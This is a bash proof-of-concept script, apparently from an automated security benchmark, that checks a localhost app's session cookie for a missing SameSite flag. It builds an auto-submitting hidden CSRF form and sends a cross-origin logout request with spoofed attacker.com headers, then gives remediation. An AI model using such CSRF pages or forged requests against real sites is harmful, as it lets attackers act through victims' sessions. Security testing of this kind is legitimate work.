#!/bin/bash
# POC: Analyzes Set-Cookie headers to confirm missing SameSite flag on session cookie and demonstrates CSRF attack vector.
# Target: ./repo
# Created: 2025-11-04T17:38:51.602Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# CSRF Attack POC - Missing SameSite Cookie Flag (Header Analysis)
# This POC demonstrates that the session cookie lacks the SameSite attribute

TARGET_URL="http://localhost:8080"

echo "[*] CSRF Vulnerability POC - Missing SameSite Flag on Session Cookie"
echo "[*] Target: $TARGET_URL"
echo ""

# Get the initial response to check for Set-Cookie headers
echo "[+] Step 1: Sending request to target..."
RESPONSE=$(curl -s -i "$TARGET_URL/" 2>&1)

echo "[+] Step 2: Analyzing Set-Cookie headers for SameSite attribute..."
echo ""

# Extract all Set-Cookie headers
SET_COOKIE_HEADERS=$(echo "$RESPONSE" | grep -i "^set-cookie:")

if [ -z "$SET_COOKIE_HEADERS" ]; then
    echo "[*] No Set-Cookie headers in initial response, attempting login flow..."
    
    # Try getting cookies from password endpoint
    RESPONSE=$(curl -s -i "$TARGET_URL/password/admin" 2>&1)
    SET_COOKIE_HEADERS=$(echo "$RESPONSE" | grep -i "^set-cookie:")
fi

echo "[+] Found Set-Cookie headers:"
echo "$SET_COOKIE_HEADERS"
echo ""

# Check for session cookie specifically
SESSION_COOKIE_HEADER=$(echo "$RESPONSE" | grep -i "^set-cookie:.*session" | head -1)

if [ -n "$SESSION_COOKIE_HEADER" ]; then
    echo "[+] Session Cookie Header Found:"
    echo "    $SESSION_COOKIE_HEADER"
    echo ""
    
    # Check for security flags
    echo "[+] Step 3: Analyzing security flags..."
    echo ""
    
    HAS_HTTPONLY=$(echo "$SESSION_COOKIE_HEADER" | grep -i "HttpOnly" && echo "YES" || echo "NO")
    HAS_SECURE=$(echo "$SESSION_COOKIE_HEADER" | grep -i "Secure" && echo "YES" || echo "NO")
    HAS_SAMESITE=$(echo "$SESSION_COOKIE_HEADER" | grep -i "SameSite" && echo "YES" || echo "NO")
    
    echo "    HttpOnly Flag:  $HAS_HTTPONLY"
    echo "    Secure Flag:    $HAS_SECURE"
    echo "    SameSite Flag:  $HAS_SAMESITE"
    echo ""
    
    if [ "$HAS_SAMESITE" = "NO" ]; then
        echo "[!] VULNERABILITY CONFIRMED: Missing SameSite Flag"
        echo ""
        echo "[+] Step 4: Demonstrating CSRF attack vector..."
        echo ""
        
        # Create HTML for CSRF attack (demonstration)
        cat > /tmp/csrf_attack.html << 'EOF'
<html>
<head>
    <title>Click here for a surprise!</title>
</head>
<body onload="document.csrf_form.submit()">
    <h1>Loading...</h1>
    <form name="csrf_form" method="POST" action="http://localhost:8080/logout" style="display:none;">
        <!-- Hidden CSRF form - submits on page load -->
    </form>
</body>
</html>
EOF
        
        echo "    CSRF Attack Form Created:"
        echo "    - Attacker creates malicious page at attacker.com/csrf"
        echo "    - Page auto-submits form to http://localhost:8080/logout"
        echo "    - Without SameSite flag, session cookie IS sent"
        echo "    - Victim is logged out without knowing"
        echo ""
        
        # Demonstrate that CSRF request succeeds
        echo "[+] Step 5: Testing CSRF attack - sending logout from cross-origin..."
        CSRF_TEST=$(curl -s -i \
          -X POST \
          "$TARGET_URL/logout" \
          -H "Origin: http://attacker.com" \
          -H "Referer: http://attacker.com/csrf" \
          2>&1)
        
        if echo "$CSRF_TEST" | grep -q "302\|200"; then
            echo "[!] CSRF Attack Succeeded: Cross-site logout request was processed"
            echo "[!] Response Status: $(echo "$CSRF_TEST" | head -1)"
            echo ""
            echo "[!] VULNERABILITY IMPACT:"
            echo "    - Attacker can perform unauthorized actions"
            echo "    - Victim's session is used for CSRF attacks"
            echo "    - No protection against cross-site request forgery"
        fi
        
        rm -f /tmp/csrf_attack.html
    else
        echo "[-] SameSite flag IS present - application appears properly configured"
    fi
else
    echo "[*] Session cookie not found in response headers"
    echo "[*] Trying to establish authenticated session first..."
    
    # Login attempt
    curl -s -c /tmp/test_cookies.txt "$TARGET_URL/password/admin" > /dev/null
    
    # Now attempt logout from different origin
    CSRF_TEST=$(curl -s -i -b /tmp/test_cookies.txt \
      -X POST \
      "$TARGET_URL/logout" \
      -H "Origin: http://attacker.com" \
      -H "Referer: http://attacker.com/csrf" \
      2>&1)
    
    echo "[+] Cross-site logout attempt result:"
    echo "$CSRF_TEST" | head -5
    
    if echo "$CSRF_TEST" | grep -q "302"; then
        echo "[!] CSRF POSSIBLE: Request was processed (HTTP 302)"
        echo "[!] Session cookie likely lacks SameSite flag"
    fi
    
    rm -f /tmp/test_cookies.txt
fi

echo ""
echo "[+] POC Analysis Complete"
echo ""
echo "[+] REMEDIATION:"
echo "    Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict; Path=/"